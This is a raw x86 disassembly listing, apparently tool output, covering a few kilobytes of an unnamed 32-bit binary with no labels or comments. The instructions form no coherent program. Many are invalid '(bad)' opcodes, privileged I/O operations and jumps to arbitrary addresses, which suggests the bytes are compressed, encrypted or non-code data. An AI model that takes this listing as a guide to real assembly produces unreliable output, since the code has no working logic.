  41cf65:	xor    eax,esp
  41cf67:	nop    DWORD PTR [ecx-0x1082da0c]
  41cf6e:	add    DWORD PTR [eax+edx*8-0x241b3bfd],ecx
  41cf75:	pop    ds
  41cf76:	xchg   edi,eax
  41cf77:	sub    al,0x6c
  41cf79:	sub    DWORD PTR [ecx+eax*4-0x32bb3dca],0xffffffbb
  41cf81:	ret    
  41cf82:	stos   BYTE PTR es:[edi],al
  41cf83:	ds jbe 0x41cf21
  41cf86:	out    0xaf,eax
  41cf88:	call   0xab3e:0x5f7301
  41cf8f:	lahf   
  41cf90:	mov    WORD PTR [eax],ss
  41cf92:	xchg   ebp,eax
  41cf93:	aaa    
  41cf94:	loopne 0x41cf24
  41cf96:	adc    eax,0x744ddbd7
  41cf9b:	mov    eax,ds:0x83242366
  41cfa0:	adc    al,0x6f
  41cfa2:	adc    ebx,esi
  41cfa4:	jbe    0x41cf51
  41cfa6:	mov    al,dh
  41cfa8:	dec    ebp
  41cfa9:	push   ds
  41cfaa:	jecxz  0x41d022
  41cfac:	mov    dl,BYTE PTR [esi-0x4f]
  41cfaf:	push   eax
  41cfb0:	nop
  41cfb1:	dec    ebp
  41cfb2:	ja     0x41d015
  41cfb4:	sub    eax,0x7045f199
  41cfb9:	lea    edx,[esi-0x3e]
  41cfbc:	mov    esp,0xa3d48599
  41cfc1:	shl    BYTE PTR [edi-0x745cf638],1
  41cfc7:	cmp    bh,BYTE PTR [edi-0x288d590d]
  41cfcd:	add    ebp,0xffffffe1
  41cfd0:	imul   ebp,DWORD PTR es:[esi+0x738e664],0x75f8370d
  41cfdb:	pop    ecx
  41cfdc:	or     eax,ebx
  41cfde:	mov    cl,0xd0
  41cfe0:	push   ss
  41cfe1:	loop   0x41cfd7
  41cfe3:	(bad)  
  41cfe4:	sbb    al,0xea
  41cfe6:	jl     0x41cfc6
  41cfe8:	xor    ebx,DWORD PTR [edx-0x3189def6]
  41cfee:	fst    st(3)
  41cff0:	cmp    al,0xa
  41cff2:	or     al,0xc0
  41cff4:	in     eax,0x3b
  41cff6:	pop    eax
  41cff7:	fsub   QWORD PTR [edx+ecx*4-0x7c]
  41cffb:	icebp  
  41cffc:	daa    
  41cffd:	mov    ?,ebx
  41cfff:	xchg   ebx,eax
  41d000:	loop   0x41cfc3
  41d002:	mov    bh,0x5f
  41d004:	jmp    0x1da2c5d5
  41d009:	daa    
  41d00a:	and    ebx,DWORD PTR [eax+0x174b061e]
  41d010:	add    BYTE PTR [ebx+ebp*2],0x6e
  41d014:	sub    BYTE PTR [edx-0x7d],bh
  41d017:	cmp    BYTE PTR [edx+ecx*1],bh
  41d01a:	addr16 out dx,al
  41d01c:	add    BYTE PTR [eax+0x23],al
  41d01f:	ins    DWORD PTR es:[edi],dx
  41d020:	stc    
  41d021:	xor    al,0xc5
  41d023:	push   ss
  41d024:	xchg   ecx,edx
  41d026:	inc    esi
  41d027:	les    edx,FWORD PTR ds:0x6aa4c492
  41d02d:	jmp    0x41cfba
  41d02f:	pop    es
  41d030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d031:	ret    
  41d032:	pop    edi
  41d033:	test   BYTE PTR [edi],dl
  41d035:	mov    bh,BYTE PTR [ecx+ecx*4]
  41d038:	cdq    
  41d039:	int3   
  41d03a:	inc    esi
  41d03b:	add    eax,0x66cbf27f
  41d040:	call   0x26018dae
  41d045:	lods   al,BYTE PTR ds:[esi]
  41d046:	push   esi
  41d047:	mov    edx,0x4c626a6b
  41d04c:	pop    ds
  41d04d:	out    dx,al
  41d04e:	jne    0x41d038
  41d050:	shl    BYTE PTR [esi+ebp*8],0x89
  41d054:	sub    al,0xa3
  41d056:	adc    BYTE PTR [esi-0x270ba6a9],ah
  41d05c:	mov    edi,?
  41d05e:	ins    DWORD PTR es:[edi],dx
  41d05f:	outs   dx,BYTE PTR ds:[esi]
  41d060:	mov    edx,0x85ba7e6f
  41d065:	and    eax,0xb7e584b9
  41d06a:	cli    
  41d06b:	sub    al,0xc
  41d06d:	js     0x41d009
  41d06f:	xchg   esi,eax
  41d070:	xor    BYTE PTR [eax-0x341a0771],cl
  41d076:	aaa    
  41d077:	scas   al,BYTE PTR es:[edi]
  41d078:	fsub   QWORD PTR [edx+0x2f]
  41d07b:	loope  0x41d0be
  41d07d:	mov    al,0x22
  41d07f:	jp     0x41d00d
  41d081:	lahf   
  41d082:	es inc ecx
  41d084:	inc    esi
  41d085:	ins    DWORD PTR es:[edi],dx
  41d086:	dec    edx
  41d087:	jp     0x41d0f5
  41d089:	jg     0x41d056
  41d08b:	nop
  41d08c:	inc    edx
  41d08d:	xchg   ebp,eax
  41d08e:	cmp    BYTE PTR [ecx],0x5
  41d091:	out    dx,al
  41d092:	sub    ecx,ecx
  41d094:	or     DWORD PTR [ecx-0x2864b833],esi
  41d09a:	push   DWORD PTR [eax]
  41d09c:	aas    
  41d09d:	and    al,0xd4
  41d09f:	dec    eax
  41d0a0:	outs   dx,DWORD PTR ds:[esi]
  41d0a1:	sub    eax,DWORD PTR [eax-0x64]
  41d0a4:	out    dx,al
  41d0a5:	jae    0x41d0b5
  41d0a7:	mov    BYTE PTR [ebx-0x30],bl
  41d0aa:	scas   al,BYTE PTR es:[edi]
  41d0ab:	les    eax,FWORD PTR [ebp-0x62fef87e]
  41d0b1:	push   esp
  41d0b2:	stos   DWORD PTR es:[edi],eax
  41d0b3:	push   esp
  41d0b4:	in     eax,dx
  41d0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b6:	or     DWORD PTR [esp+ecx*2+0xb0a7631],ebp
  41d0bd:	les    esi,FWORD PTR [ebp+0x55ad288f]
  41d0c3:	pop    edi
  41d0c4:	icebp  
  41d0c5:	jmp    0x2c710238
  41d0ca:	xor    dh,BYTE PTR [edi]
  41d0cc:	fsubp  st(5),st
  41d0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0cf:	stos   DWORD PTR es:[edi],eax
  41d0d0:	dec    edi
  41d0d1:	scas   al,BYTE PTR es:[edi]
  41d0d2:	cmp    esi,DWORD PTR [ecx-0x361c5e92]
  41d0d8:	sub    al,0xc
  41d0da:	pop    ebp
  41d0db:	sub    esi,DWORD PTR [ebx-0x38]
  41d0de:	sti    
  41d0df:	sti    
  41d0e0:	ficomp DWORD PTR [ebx-0x6c203f64]
  41d0e6:	shr    DWORD PTR [esi+ecx*8+0x592ebbd1],1
  41d0ed:	imul   esp,DWORD PTR [edi+0x3e],0x4512c9c8
  41d0f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0f5:	(bad)
  41d0fa:	xchg   BYTE PTR [edi+0x65e03082],dh
  41d100:	sbb    edi,edi
  41d102:	(bad)  
  41d103:	cs in  eax,dx
  41d105:	lea    esp,[esi+0xa1526bf]
  41d10b:	jecxz  0x41d16d
  41d10d:	push   edx
  41d10e:	and    dl,BYTE PTR [ebp-0x1ff08875]
  41d114:	sbb    ch,al
  41d116:	shl    BYTE PTR [ecx-0x2202511b],0x4a
  41d11d:	and    al,0x38
  41d11f:	fs mov al,0x2b
  41d122:	sub    al,0x98
  41d124:	je     0x41d128
  41d126:	or     al,0x40
  41d128:	sbb    edi,DWORD PTR [edi+0x1d]
  41d12b:	pop    edi
  41d12c:	sub    ebp,eax
  41d12e:	sub    al,0x65
  41d130:	scas   eax,DWORD PTR es:[edi]
  41d131:	push   ebp
  41d132:	jp     0x41d0be
  41d134:	dec    eax
  41d135:	iret   
  41d136:	mov    bh,0x3e
  41d138:	push   ss
  41d139:	imul   ebx,DWORD PTR [ecx],0xfffffff5
  41d13c:	mov    esp,0x93d820c3
  41d141:	jns    0x41d16c
  41d143:	ja     0x41d16e
  41d145:	sbb    eax,0x89642c5f
  41d14a:	(bad)  
  41d14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d14e:	addr16 sub eax,0x12816172
  41d154:	adc    esp,esi
  41d156:	mov    dl,0x20
  41d158:	(bad)  
  41d159:	repnz outs dx,DWORD PTR ds:[esi]
  41d15b:	jmp    0x4ca561c7
  41d160:	rcl    DWORD PTR [esi],cl
  41d162:	ins    BYTE PTR es:[edi],dx
  41d163:	jbe    0x41d143
  41d165:	repz add ebp,edi
  41d168:	push   es
  41d169:	xchg   ebp,eax
  41d16a:	push   ss
  41d16b:	sub    ebx,DWORD PTR [ebp-0x1b4fd991]
  41d171:	mov    bl,0x47
  41d173:	mov    esi,0x57a72a50
  41d178:	push   esp
  41d179:	popa   
  41d17a:	aas    
  41d17b:	adc    BYTE PTR [eax+0x61],cl
  41d17e:	dec    edx
  41d17f:	mov    ebp,0x1d7b3dd8
  41d184:	dec    ecx
  41d185:	inc    esp
  41d186:	cmp    cl,BYTE PTR [ebp+0x6986d141]
  41d18c:	rcl    ecx,cl
  41d18e:	xchg   esp,eax
  41d18f:	retf   0x50a3
  41d192:	adc    eax,DWORD PTR ds:0x685dd98b
  41d198:	cmp    bl,ch
  41d19a:	dec    ebp
  41d19b:	popf   
  41d19c:	repz pop edi
  41d19e:	xorps  xmm2,XMMWORD PTR [ebx+edi*4]
  41d1a2:	dec    ebp
  41d1a3:	shr    DWORD PTR [edx+0x21f71b4a],cl
  41d1a9:	mov    cl,BYTE PTR [ecx+0x302be257]
  41d1af:	sbb    DWORD PTR ds:0x387c2ce,ecx
  41d1b5:	jne    0x41d201
  41d1b7:	popf   
  41d1b8:	lods   al,BYTE PTR ds:[esi]
  41d1b9:	outs   dx,DWORD PTR ds:[esi]
  41d1ba:	lods   al,BYTE PTR ds:[esi]
  41d1bb:	popa   
  41d1bc:	(bad)  
  41d1bd:	rcr    BYTE PTR [ebp-0x7b],1
  41d1c0:	pop    esi
  41d1c1:	aaa    
  41d1c2:	jl     0x41d172
  41d1c4:	fld    st(6)
  41d1c6:	and    eax,0x82af339e
  41d1cb:	ss and al,0x17
  41d1ce:	sahf   
  41d1cf:	icebp  
  41d1d0:	mov    eax,ds:0xfda63ed0
  41d1d5:	xchg   DWORD PTR [ecx],ecx
  41d1d7:	lahf   
  41d1d8:	cmp    ah,BYTE PTR [ecx+0x3b64e3a8]
  41d1de:	dec    esi
  41d1df:	jns    0x41d215
  41d1e1:	test   BYTE PTR [edi+0x68],al
  41d1e4:	pushf  
  41d1e5:	test   al,0x3
  41d1e7:	or     BYTE PTR [esi+eiz*2+0x49],al
  41d1eb:	fimul  DWORD PTR [ebp-0x33b410ea]
  41d1f1:	dec    ebx
  41d1f2:	or     BYTE PTR [eax],cl
  41d1f4:	xor    eax,0x7a642d2
  41d1f9:	iret   
  41d1fa:	pop    edi
  41d1fb:	stos   DWORD PTR es:[edi],eax
  41d1fc:	mov    ebx,0x788f9e54
  41d201:	inc    sp
  41d203:	xchg   ecx,eax
  41d204:	cmp    edi,DWORD PTR ss:[eax+0x29784c34]
  41d20b:	push   esp
  41d20c:	pop    esi
  41d20d:	jle    0x41d260
  41d20f:	add    al,0xde
  41d211:	jecxz  0x41d1f3
  41d213:	xchg   ecx,eax
  41d214:	lock jl 0x41d214
  41d217:	pop    ss
  41d218:	(bad)  
  41d21a:	(bad)  
  41d21b:	fmul   DWORD PTR [esi+edi*4+0x4a]
  41d21f:	inc    edx
  41d220:	sub    ch,BYTE PTR [edx+0x67]
  41d223:	(bad)  
  41d224:	add    al,BYTE PTR [esi-0x66]
  41d227:	push   ebp
  41d228:	(bad)  
  41d229:	aad    0x6c
  41d22b:	enter  0x6af8,0x8d
  41d22f:	rcr    DWORD PTR [eax],cl
  41d231:	pop    ebp
  41d232:	sbb    BYTE PTR [edi+0x7],cl
  41d235:	or     DWORD PTR [eax+0x658d0b75],ebx
  41d23b:	test   BYTE PTR [edi+esi*1],dh
  41d23e:	or     cl,BYTE PTR [ebp-0x5c00ed2c]
  41d244:	gs loopne 0x41d219
  41d247:	cdq    
  41d248:	and    BYTE PTR [eax],dh
  41d24a:	sub    DWORD PTR [esi-0x4a4be95d],ecx
  41d250:	in     al,0xbd
  41d252:	sbb    BYTE PTR [ebp+0x2e],0x8f
  41d256:	sahf   
  41d257:	out    0x28,eax
  41d259:	jge    0x41d2b0
  41d25b:	ror    BYTE PTR [ecx],1
  41d25d:	cmp    edi,edx
  41d25f:	lds    ecx,FWORD PTR [ebx-0x196f5d90]
  41d265:	adc    dh,BYTE PTR [esi+0x3e628f1]
  41d26b:	mov    cl,bh
  41d26d:	jae    0x41d276
  41d26f:	jb     0x41d242
  41d271:	pop    ebx
  41d272:	jbe    0x41d1f6
  41d274:	xor    edi,ebx
  41d276:	scas   al,BYTE PTR es:[edi]
  41d277:	hlt    
  41d278:	add    DWORD PTR [ebx],edx
  41d27a:	enter  0xeaba,0xe7
  41d27e:	mov    ecx,0xb797bc9e
  41d283:	and    BYTE PTR [ebx],bh
  41d285:	xchg   cl,ch
  41d287:	inc    edi
  41d288:	shr    DWORD PTR [edx+0xa],0x6c
  41d28c:	or     eax,0x9dd157b0
  41d291:	ja     0x41d30c
  41d293:	dec    esp
  41d294:	enter  0xa2d4,0x6c
  41d298:	cmp    eax,0x883c2cf4
  41d29d:	in     al,0x1e
  41d29f:	or     edi,DWORD PTR [ecx]
  41d2a1:	gs cmp al,0x2e
  41d2a4:	lds    esi,FWORD PTR [ecx+0x40]
  41d2a7:	loope  0x41d2b7
  41d2a9:	inc    ebx
  41d2aa:	mov    dl,0x97
  41d2ac:	repnz nop
  41d2ae:	(bad)  
  41d2b0:	or     BYTE PTR [ebp-0xe0196],ah
  41d2b6:	cld    
  41d2b7:	and    cl,ch
  41d2b9:	popf   
  41d2ba:	icebp  
  41d2bb:	mov    esi,0x6199263f
  41d2c0:	int    0x6f
  41d2c2:	and    DWORD PTR [ebx+edi*8-0x5b],ebp
  41d2c6:	pop    esi
  41d2c7:	pusha  
  41d2c8:	adc    DWORD PTR [ebx-0x5b715089],ecx
  41d2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2cf:	or     al,0x9e
  41d2d1:	pop    es
  41d2d2:	inc    ebp
  41d2d3:	and    al,0x5d
  41d2d5:	pop    ss
  41d2d6:	inc    BYTE PTR [edx]
  41d2d8:	fnstsw WORD PTR [edx-0x52]
  41d2db:	imul   eax,DWORD PTR [ebx-0x69],0xc8c5583
  41d2e2:	xchg   edx,eax
  41d2e3:	loopne 0x41d314
  41d2e5:	in     eax,0x39
  41d2e7:	int    0x72
  41d2e9:	loop   0x41d28e
  41d2eb:	sub    ah,BYTE PTR [ebp-0x1e2d982]
  41d2f1:	add    al,BYTE PTR [ecx]
  41d2f3:	shl    BYTE PTR [eax+0x74636416],0xa4
  41d2fa:	inc    edi
  41d2fb:	pop    ebp
  41d2fc:	gs push cs
  41d2fe:	jmp    0xe0bc8aa7
  41d303:	hlt    
  41d304:	inc    edx
  41d305:	or     BYTE PTR [ecx],bl
  41d307:	cmp    BYTE PTR [ebx],bl
  41d309:	mov    al,ds:0xd15690a2
  41d30e:	sbb    esp,DWORD PTR [ecx]
  41d310:	in     al,dx
  41d311:	outs   dx,BYTE PTR ds:[esi]
  41d312:	mov    eax,0x4b26b3b
  41d317:	push   ebx
  41d318:	or     DWORD PTR [edx-0x4f],0xa5a81ecc
  41d31f:	iret   
  41d320:	inc    esp
  41d321:	in     al,dx
  41d322:	and    al,0x3d
  41d324:	or     eax,0xf73e5e35
  41d329:	xchg   ebp,eax
  41d32a:	or     bl,al
  41d32c:	clc    
  41d32d:	inc    esi
  41d32e:	add    al,cl
  41d330:	sbb    al,0xf7
  41d332:	cli    
  41d333:	out    dx,eax
  41d334:	xor    ebp,DWORD PTR [ecx]
  41d336:	push   ds
  41d337:	mov    al,ds:0x155a1a0b
  41d33c:	scas   al,BYTE PTR es:[edi]
  41d33d:	inc    eax
  41d33e:	out    0xaf,al
  41d340:	(bad)  
  41d342:	mov    esi,0x68af0140
  41d347:	popa   
  41d348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d349:	dec    edx
  41d34a:	ret    
  41d34b:	scas   al,BYTE PTR es:[edi]
  41d34c:	fiadd  DWORD PTR [ebp-0x1141dca]
  41d352:	pop    edx
  41d353:	fwait
  41d354:	pop    es
  41d355:	xchg   esp,eax
  41d356:	push   edx
  41d357:	arpl   WORD PTR [ecx+eax*4+0x1d],ax
  41d35b:	dec    edi
  41d35c:	cmp    al,0xb7
  41d35e:	fucomp st(2)
  41d360:	push   0xffffff9c
  41d362:	inc    eax
  41d363:	fs jmp 0xe133953b
  41d369:	aaa    
  41d36a:	cmp    bh,BYTE PTR [ebx+0x3540f23c]
  41d370:	push   es
  41d371:	loopne 0x41d3d2
  41d373:	cmp    al,0x64
  41d375:	sti    
  41d376:	mov    ds:0x88f3a512,eax
  41d37b:	xchg   edi,eax
  41d37c:	cld    
  41d37d:	xor    al,0x50
  41d37f:	add    DWORD PTR [eax+ebp*1-0x66],esp
  41d383:	lea    esp,[esi+0x2e]
  41d386:	repnz xchg edi,eax
  41d388:	mov    ah,0x19
  41d38a:	jae    0x41d3ef
  41d38c:	push   ecx
  41d38d:	pop    edi
  41d38e:	push   edx
  41d38f:	lahf   
  41d390:	push   ebp
  41d391:	inc    eax
  41d392:	xchg   edi,eax
  41d393:	(bad)  
  41d394:	call   0xd3861139
  41d399:	fdivr  QWORD PTR [esi+0x6f2b2b1b]
  41d39f:	sti    
  41d3a0:	sub    ah,cl
  41d3a2:	push   esp
  41d3a3:	dec    esp
  41d3a4:	std    
  41d3a5:	int    0xb5
  41d3a7:	mov    esi,0x4f9d2fa3
  41d3ac:	fisttp WORD PTR [eax]
  41d3ae:	das    
  41d3af:	fistp  QWORD PTR [esi+edx*8]
  41d3b2:	jb     0x41d3c5
  41d3b4:	sar    BYTE PTR [esi-0x12628ff],0x7e
  41d3bb:	jns    0x41d3ad
  41d3bd:	(bad)  
  41d3bf:	dec    ebx
  41d3c0:	aaa    
  41d3c1:	loopne 0x41d42b
  41d3c3:	bound  ebp,QWORD PTR [edx]
  41d3c5:	cdq    
  41d3c6:	mov    ebp,0xa02e4c5d
  41d3cb:	aaa    
  41d3cc:	jecxz  0x41d3b1
  41d3ce:	ret    
  41d3cf:	mov    ebp,0xb2576ab0
  41d3d4:	out    dx,al
  41d3d5:	test   BYTE PTR [edx-0x1b],0x14
  41d3d9:	add    al,0x53
  41d3db:	sub    DWORD PTR [edx-0x2b],0xb82c1a3c
  41d3e2:	dec    ebp
  41d3e3:	jbe    0x41d40b
  41d3e5:	xor    BYTE PTR [edx],cl
  41d3e7:	loopne 0x41d452
  41d3e9:	add    BYTE PTR [esi+eiz*4+0x119e673c],dl
  41d3f0:	and    esp,eax
  41d3f2:	daa    
  41d3f3:	and    dl,BYTE PTR [esi+0x6c8c5866]
  41d3f9:	mov    al,0x29
  41d3fb:	test   edi,esi
  41d3fd:	fwait
  41d3fe:	dec    esi
  41d3ff:	fs sti 
  41d401:	fisub  WORD PTR [edx+edx*2+0x73]
  41d405:	sar    DWORD PTR [eax+0x2],1
  41d408:	push   ebp
  41d409:	xor    DWORD PTR [edx],0x20
  41d40c:	aas    
  41d40d:	pop    ds
  41d40e:	xchg   esi,eax
  41d40f:	sub    bh,cl
  41d411:	mov    eax,0xe4fc1aa3
  41d416:	fist   DWORD PTR [ebp+0x5b47a4e]
  41d41c:	sub    al,0xe5
  41d41e:	jmp    0x68f55554
  41d423:	bound  edi,QWORD PTR [ebx-0x6dc27918]
  41d429:	push   edi
  41d42a:	mov    ss,WORD PTR [eax+0x3b2b241]
  41d430:	and    eax,0x771cf785
  41d435:	retf   
  41d436:	call   0xebe3709f
  41d43b:	and    esi,edx
  41d43d:	loope  0x41d40c
  41d43f:	mov    al,BYTE PTR [edx-0x37]
  41d442:	sbb    DWORD PTR [ebp+0x4fe13e8c],eax
  41d448:	lods   al,BYTE PTR ds:[esi]
  41d449:	(bad)  
  41d44a:	pop    eax
  41d44b:	nop
  41d44c:	inc    esi
  41d44d:	aas    
  41d44e:	lock mov ebx,0x52833e27
  41d454:	or     al,ch
  41d456:	xor    DWORD PTR [ebx+0x3c4d151f],ebx
  41d45c:	clc    
  41d45d:	push   ds
  41d45e:	aaa    
  41d45f:	and    DWORD PTR [eax-0x7d080b13],eax
  41d465:	jne    0x41d4c3
  41d467:	jmp    0x41d446
  41d469:	and    DWORD PTR [bx+0x46],eax
  41d46d:	xchg   ebx,eax
  41d46e:	xchg   edx,eax
  41d46f:	sti    
  41d470:	into   
  41d471:	ret    
  41d472:	jno    0x41d48a
  41d474:	add    dl,al
  41d476:	xchg   edi,eax
  41d477:	imul   edx,ebp,0xffffffb2
  41d47a:	sahf   
  41d47b:	sar    BYTE PTR [ecx+ebx*4-0x678c265c],0x96
  41d483:	stos   DWORD PTR es:[edi],eax
  41d484:	jne    0x41d4dc
  41d486:	or     al,0xa4
  41d488:	stos   BYTE PTR es:[edi],al
  41d489:	adc    BYTE PTR [ecx],0x13
  41d48c:	xor    al,0x91
  41d48e:	inc    esi
  41d48f:	mov    esi,0x3480bbae
  41d494:	lods   al,BYTE PTR ds:[esi]
  41d495:	pop    esp
  41d496:	cmp    bl,dh
  41d498:	xchg   ebx,eax
  41d499:	je     0x41d4a0
  41d49b:	adc    eax,0x375ff75e
  41d4a0:	fld    DWORD PTR [eax-0x20]
  41d4a3:	mov    edx,0x2ff1162
  41d4a8:	scas   eax,DWORD PTR es:[edi]
  41d4a9:	in     eax,dx
  41d4aa:	or     esi,DWORD PTR [esi+edx*4]
  41d4ad:	pop    ebp
  41d4ae:	xor    DWORD PTR ds:0x3d2d2e93,esp
  41d4b4:	jecxz  0x41d4d5
  41d4b6:	mov    al,ds:0xf2929c51
  41d4bb:	and    BYTE PTR [ebp-0x62],ch
  41d4be:	inc    eax
  41d4bf:	enter  0xe939,0xce
  41d4c3:	inc    eax
  41d4c4:	cs addr16 push esp
  41d4c7:	out    dx,eax
  41d4c8:	addr16 mov dh,0xb4
  41d4cb:	in     al,0x27
  41d4cd:	jecxz  0x41d535
  41d4cf:	mov    cs,WORD PTR [eax]
  41d4d1:	cs push 0xffffff88
  41d4d4:	mov    ah,0xf3
  41d4d6:	scas   eax,DWORD PTR es:[edi]
  41d4d7:	ret    0xb939
  41d4da:	clc    
  41d4db:	out    dx,al
  41d4dc:	mov    fs,edx
  41d4de:	jae    0x41d4c5
  41d4e0:	push   ss
  41d4e1:	and    esp,DWORD PTR [edi+eiz*1+0x42]
  41d4e5:	(bad)  
  41d4e6:	dec    eax
  41d4e7:	xchg   ecx,eax
  41d4e8:	pusha  
  41d4e9:	loop   0x41d544
  41d4eb:	ins    BYTE PTR es:[edi],dx
  41d4ec:	in     al,dx
  41d4ed:	setne  al
  41d4f0:	jnp    0x41d4e3
  41d4f2:	sub    ah,ah
  41d4f4:	mov    ds,WORD PTR [edi]
  41d4f6:	and    BYTE PTR [esi+0x62724aa2],0x7f
  41d4fd:	repz arpl bx,sp
  41d500:	pop    edx
  41d501:	dec    esp
  41d502:	call   0x3be2:0x4d61b0a
  41d509:	sbb    BYTE PTR [edx],bl
  41d50b:	fdivr  st(4),st
  41d50d:	push   ss
  41d50e:	test   al,0xa7
  41d510:	xchg   esi,eax
  41d511:	push   edi
  41d512:	stc    
  41d513:	rcl    BYTE PTR [ebp+0x1dc7c5f1],1
  41d519:	xor    eax,0xb0943907
  41d51e:	mov    eax,ds:0x9ed90196
  41d523:	inc    ecx
  41d524:	arpl   WORD PTR [ecx],si
  41d526:	(bad)  
  41d528:	inc    ebp
  41d529:	jmp    0x41d599
  41d52b:	std    
  41d52c:	pop    ebp
  41d52d:	adc    eax,ebp
  41d52f:	lods   al,BYTE PTR ds:[esi]
  41d530:	data16 int3 
  41d532:	aaa    
  41d533:	cmp    eax,0x568153ff
  41d538:	jge    0x41d537
  41d53a:	mov    eax,edi
  41d53c:	add    bh,ah
  41d53e:	mov    ebp,0x7a39167b
  41d543:	xchg   edx,eax
  41d544:	and    BYTE PTR [esi-0x5],ah
  41d547:	adc    BYTE PTR [esi+0x7e179472],dl
  41d54d:	lock sahf 
  41d54f:	adc    al,BYTE PTR fs:[eax+0x22]
  41d553:	add    al,0x2d
  41d555:	xlat   BYTE PTR ds:[ebx]
  41d556:	jns    0x41d522
  41d558:	arpl   WORD PTR [ebx],sp
  41d55a:	fwait
  41d55b:	call   0xa0f20bf
  41d560:	leave  
  41d561:	mov    ebx,0x90548f8f
  41d566:	push   edx
  41d567:	test   BYTE PTR [eax+esi*1+0x6234d4b1],bl
  41d56e:	not    DWORD PTR [edi+0x79]
  41d571:	les    esp,FWORD PTR [edi+0x4e]
  41d574:	mov    edx,0x69117d6e
  41d579:	dec    esp
  41d57a:	div    DWORD PTR [ecx]
  41d57c:	outs   dx,BYTE PTR ds:[esi]
  41d57d:	and    al,BYTE PTR [edi]
  41d57f:	lods   al,BYTE PTR ds:[esi]
  41d580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d581:	mov    BYTE PTR [esi-0x18129e56],ah
  41d587:	jg     0x41d5c6
  41d589:	mov    eax,0x4f3180b1
  41d58e:	jp     0x41d5e4
  41d590:	inc    esi
  41d591:	test   eax,0x41e63977
  41d596:	je     0x41d51e
  41d598:	xor    al,BYTE PTR [edx-0x70fff484]
  41d59e:	push   0x74
  41d5a0:	xchg   BYTE PTR [ecx+0x32d30870],ch
  41d5a6:	jb     0x41d5ab
  41d5a8:	loopne 0x41d614
  41d5aa:	inc    edi
  41d5ab:	lock jae 0x41d537
  41d5ae:	test   eax,0xbd818825
  41d5b3:	push   edx
  41d5b4:	pop    es
  41d5b5:	xchg   esi,eax
  41d5b6:	jle    0x41d55e
  41d5b8:	push   ds
  41d5b9:	push   0x9adeee64
  41d5be:	push   ebp
  41d5bf:	mov    dh,0xae
  41d5c1:	and    al,0xca
  41d5c3:	inc    esp
  41d5c4:	xchg   edx,eax
  41d5c5:	test   DWORD PTR [ecx-0x72],edi
  41d5c8:	in     al,dx
  41d5c9:	jle    0x41d603
  41d5cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5cc:	dec    ebx
  41d5cd:	jecxz  0x41d5c2
  41d5cf:	mov    al,0xca
  41d5d1:	sub    BYTE PTR ds:0x6fb1cd5e,ah
  41d5d7:	mov    BYTE PTR [edx],bl
  41d5d9:	(bad)  [eax+0x5a]
  41d5dc:	push   esi
  41d5dd:	cmp    dl,BYTE PTR [eax-0x60]
  41d5e0:	add    al,0x4d
  41d5e2:	fucomp st(1)
  41d5e4:	fdivr  QWORD PTR [edx]
  41d5e6:	add    al,0xf8
  41d5e8:	adc    BYTE PTR [ecx+0x4e],al
  41d5eb:	adc    DWORD PTR ss:[esi+ebp*2-0x6ab6b5ca],edi
  41d5f3:	mov    dh,0xd7
  41d5f5:	pop    es
  41d5f6:	mov    esi,0xb1eedc03
  41d5fb:	shl    BYTE PTR [edx-0x55d7855],cl
  41d601:	in     al,dx
  41d602:	retf   0x996a
  41d605:	or     ah,BYTE PTR [esi+0x43]
  41d608:	stc    
  41d609:	pusha  
  41d60a:	pop    esi
  41d60b:	ret    0x35e2
  41d60e:	sbb    DWORD PTR [ebp-0x37c0e87a],ebp
  41d614:	xlat   BYTE PTR ds:[ebx]
  41d615:	xchg   ebx,eax
  41d616:	sub    ah,cl
  41d618:	push   esi
  41d619:	mov    eax,0x7bb12108
  41d61e:	ins    BYTE PTR es:[edi],dx
  41d61f:	mov    WORD PTR [ebx-0x3b],es
  41d622:	sub    BYTE PTR [esi+0x6e999e0f],bl
  41d628:	hlt    
  41d629:	jmp    0x41d630
  41d62b:	mov    edi,0xbbc1ed75
  41d630:	iret   
  41d631:	popf   
  41d632:	clc    
  41d633:	fwait
  41d634:	clc    
  41d635:	push   edx
  41d636:	pop    edx
  41d637:	push   ecx
  41d638:	cmp    edx,DWORD PTR [eax+0x692a8805]
  41d63e:	jle    0x41d62d
  41d640:	jae    0x41d64e
  41d642:	jmp    0x41d699
  41d644:	fwait
  41d645:	xchg   esp,eax
  41d646:	test   BYTE PTR [eax],bl
  41d648:	jnp    0x41d656
  41d64a:	push   ds
  41d64b:	ret    
  41d64c:	add    al,0x80
  41d64e:	xchg   edi,eax
  41d64f:	out    0x19,al
  41d651:	int3   
  41d652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d653:	pushf  
  41d654:	mov    ds:0x4620847a,eax
  41d659:	call   0x5e1b7a7b
  41d65e:	gs dec esp
  41d660:	outs   dx,BYTE PTR ds:[esi]
  41d661:	adc    eax,eax
  41d663:	or     eax,0xb4943ea9
  41d668:	add    al,0xdb
  41d66a:	mov    edi,0x5bef7817
  41d66f:	fmul   QWORD PTR [edi+0x49ffdac8]
  41d675:	jmp    0xb3f3:0xca4983ee
  41d67c:	(bad)  
  41d67d:	cmp    al,0x9e
  41d67f:	stc    
  41d680:	nop
  41d681:	add    esp,esp
  41d683:	and    ebx,DWORD PTR [edx]
  41d685:	and    dl,ch
  41d687:	xor    ah,dl
  41d689:	dec    edi
  41d68a:	in     eax,0x87
  41d68c:	jne    0x41d6ab
  41d68e:	loopne 0x41d6f2
  41d690:	pusha  
  41d691:	cmp    eax,0xf2dde29c
  41d696:	rcr    DWORD PTR ds:0xfcce6927,cl
  41d69c:	cmp    eax,0xd5337a8f
  41d6a1:	adc    al,0x5a
  41d6a3:	(bad)
  41d6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6a8:	fwait
  41d6a9:	call   0x36cf:0xed78cf43
  41d6b0:	pop    ebx
  41d6b1:	fistp  DWORD PTR [edx]
  41d6b3:	leave  
  41d6b4:	cmp    DWORD PTR [edi+0x20ce72aa],0xc7e9cf2
  41d6be:	rol    DWORD PTR [edi],0x12
  41d6c1:	and    BYTE PTR [ebx+eiz*4+0x78],0xc3
